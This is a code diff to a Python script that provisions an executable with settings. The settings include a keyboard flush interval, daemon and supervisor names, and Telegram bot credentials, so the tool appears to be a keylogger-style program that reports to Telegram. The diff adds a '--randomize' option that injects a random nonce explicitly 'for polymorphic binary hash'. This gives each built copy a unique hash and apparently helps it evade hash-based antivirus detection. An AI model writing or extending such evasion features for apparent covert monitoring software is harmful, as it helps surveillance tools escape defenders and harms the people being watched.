@@ -58,6 +58,8 @@ ALLOWED_KEYS = {
     "C2T_KEYBOARD_FLUSH_MS",
     "C2T_DAEMON_NAME",
     "C2T_SUPERVISOR_NAME",
+    "C2T_NONCE",
+    "C2T_BUILD_ID",
     "C2T_PROXY",
     "TELEGRAM_PROXY",
     "TELEGRAM_BOT_TOKEN",
@@ -80,6 +82,8 @@ FLAG_KEYS = {
 STRING_KEYS = {
     "C2T_DAEMON_NAME",
     "C2T_SUPERVISOR_NAME",
+    "C2T_NONCE",
+    "C2T_BUILD_ID",
 }
 SIZE_KEYS = ALLOWED_KEYS - FLAG_KEYS - SENSITIVE_KEYS - STRING_KEYS
 
@@ -133,8 +137,8 @@ def parse_config(stream) -> dict[str, str]:
             raise ProvisionError(f"{key} must be 0 or 1")
         if key in SIZE_KEYS and (not value.isascii() or not value.isdecimal() or int(value) == 0):
             raise ProvisionError(f"{key} must be a positive decimal integer")
-        if key in STRING_KEYS and not re.match(r"^[a-zA-Z0-9_.-]{1,15}$", value):
-            raise ProvisionError(f"{key} must be 1-15 alphanumeric characters (_.- allowed)")
+        if key in STRING_KEYS and not re.match(r"^[a-zA-Z0-9_.-]{1,64}$", value):
+            raise ProvisionError(f"{key} must be 1-64 alphanumeric characters (_.- allowed)")
         if key == "TELEGRAM_BOT_TOKEN" and len(value.encode("utf-8")) >= 512:
             raise ProvisionError("TELEGRAM_BOT_TOKEN is too long")
         if key == "TELEGRAM_CHAT_ID" and len(value.encode("utf-8")) >= 128:
@@ -293,6 +297,11 @@ def argument_parser() -> argparse.ArgumentParser:
         metavar="KEY",
         help="read KEY directly from this process environment; repeatable",
     )
+    parser.add_argument(
+        "--randomize",
+        action="store_true",
+        help="inject a unique random cryptographic nonce (C2T_NONCE) for polymorphic binary hash",
+    )
     parser.add_argument("--output", type=Path, help="write a provisioned copy here")
     parser.add_argument("--in-place", action="store_true", help="replace the input executable")
     parser.add_argument("--force", action="store_true", help="allow replacing an existing output")
@@ -304,10 +313,14 @@ def argument_parser() -> argparse.ArgumentParser:
 def main() -> int:
     parser = argument_parser()
     arguments = parser.parse_args()
-    has_configuration = arguments.config is not None or bool(arguments.from_env)
+    has_configuration = (
+        arguments.config is not None
+        or bool(arguments.from_env)
+        or arguments.randomize
+    )
     actions = sum((arguments.clear, arguments.inspect, has_configuration))
     if actions != 1:
-        parser.error("choose exactly one of --config, --clear, or --inspect")
+        parser.error("choose exactly one of --config, --clear, --inspect, or --randomize")
     if arguments.in_place and arguments.output:
         parser.error("--in-place and --output are mutually exclusive")
     if arguments.in_place and arguments.force:
@@ -353,6 +366,10 @@ def main() -> int:
         if "\n" in value or "\r" in value:
             raise ProvisionError(f"newline in environment value for {key}")
         config.update(parse_config([f"{key}={value}\n"]))
+
+    if arguments.randomize and "C2T_NONCE" not in config and "C2T_BUILD_ID" not in config:
+        import secrets
+        config["C2T_NONCE"] = secrets.token_hex(16)
 
     payload = encode_payload(config)
     output = arguments.executable if arguments.in_place else arguments.output
